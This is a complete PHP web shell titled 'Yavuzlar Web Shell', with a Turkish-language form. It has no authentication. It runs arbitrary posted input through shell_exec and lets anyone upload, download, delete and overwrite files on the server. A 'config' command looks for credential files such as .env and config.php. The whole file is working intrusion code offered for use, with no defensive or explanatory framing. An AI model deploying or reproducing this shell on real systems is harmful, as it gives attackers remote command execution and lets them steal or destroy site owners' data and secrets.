<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yavuzlar Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }

        .container {
            width: 80%;
            margin-top: 0.3rem;
            padding: 20px;
            background-color: #007BFF;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        h1 {
            text-align: center;
        }

        .file-manager {
            margin-top: 20px;
        }

        .file-manager input[type="text"], .file-manager input[type="file"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 10px;
        }

        .file-manager input[type="submit"] {
            padding: 10px 20px;
            background-color: #007BFF;
            color: #fff;
            border: none;
            cursor: pointer;
        }

        .file-manager input[type="submit"]:hover {
            background-color: #0056b3;
        }

        .output {
            margin-top: 20px;
            padding: 10px;
            background-color: #e9ecef;
            border: 1px solid #ced4da;
        }
    </style>
</head>
<body>
    <header>
        <h1>Yavuzlar Web Shell</h1>
    </header>
    <div class="container">
    
        <div class="file-manager">
            <form method="post" enctype="multipart/form-data">
                <input type="text" name="command" placeholder="Komut girin">
                <input type="file" name="file">
                <input type="submit" value="Çalıştır">
            </form>
        </div>
        <div class="output">
            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $command = $_POST['command'];
                if (!empty($command)) {
                    switch ($command) {
                        case 'help':
                            echo "<pre>Komutlar:\n";
                            echo "upload: Dosya yükleme\n";
                            echo "download [dosya yolu]: Dosya indirme\n";
                            echo "delete [dosya yolu]: Dosya silme\n";
                            echo "edit [dosya yolu] [içerik]: Dosya düzenleme\n";
                            echo "search [dosya adı]: Dosya arama\n";
                            echo "permissions [dosya yolu]: Dosya izinlerini gösterme\n";
                            echo "config: Konfigürasyon dosyalarını tespit etme\n";
                            echo "</pre>";
                            break;
                        case 'upload':
                            if (isset($_FILES['file'])) {
                                $file = $_FILES['file'];
                                move_uploaded_file($file['tmp_name'], $file['name']);
                                echo "<pre>Dosya yüklendi: " . $file['name'] . "</pre>";
                            }
                            break;
                        case (preg_match('/^download (.+)$/', $command, $matches) ? true : false):
                            $file = $matches[1];
                            if (file_exists($file)) {
                                header('Content-Description: File Transfer');
                                header('Content-Type: application/octet-stream');
                                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                                header('Expires: 0');
                                header('Cache-Control: must-revalidate');
                                header('Pragma: public');
                                header('Content-Length: ' . filesize($file));
                                readfile($file);
                                exit;
                            } else {
                                echo "<pre>Dosya bulunamadı: $file</pre>";
                            }
                            break;
                        case (preg_match('/^delete (.+)$/', $command, $matches) ? true : false):
                            $file = $matches[1];
                            if (file_exists($file)) {
                                unlink($file);
                                echo "<pre>Dosya silindi: $file</pre>";
                            } else {
                                echo "<pre>Dosya bulunamadı: $file</pre>";
                            }
                            break;
                        case (preg_match('/^edit (.+) (.+)$/', $command, $matches) ? true : false):
                            $file = $matches[1];
                            $content = $matches[2];
                            file_put_contents($file, $content);
                            echo "<pre>Dosya düzenlendi: $file</pre>";
                            break;
                        case (preg_match('/^search (.+)$/', $command, $matches) ? true : false):
                            $filename = $matches[1];
                            $files = glob("**/$filename");
                            echo "<pre>Dosya arama sonuçları:\n" . implode("\n", $files) . "</pre>";
                            break;
                        case (preg_match('/^permissions (.+)$/', $command, $matches) ? true : false):
                            $file = $matches[1];
                            if (file_exists($file)) {
                                $perms = fileperms($file);
                                echo "<pre>Dosya izinleri: " . substr(sprintf('%o', $perms), -4) . "</pre>";
                            } else {
                                echo "<pre>Dosya bulunamadı: $file</pre>";
                            }
                            break;
                        case 'config':
                            $configFiles = ['config.php', 'settings.php', '.env'];
                            $foundConfigs = [];
                            foreach ($configFiles as $configFile) {
                                if (file_exists($configFile)) {
                                    $foundConfigs[] = $configFile;
                                }
                            }
                            echo "<pre>Konfigürasyon dosyaları:\n" . implode("\n", $foundConfigs) . "</pre>";
                            break;
                        default:
                            echo "<pre>" . shell_exec($command) . "</pre>";
                            break;
                    }
                }
            }
            ?>
        </div>
    </div>
    <footer>

    </footer>
</body>
</html>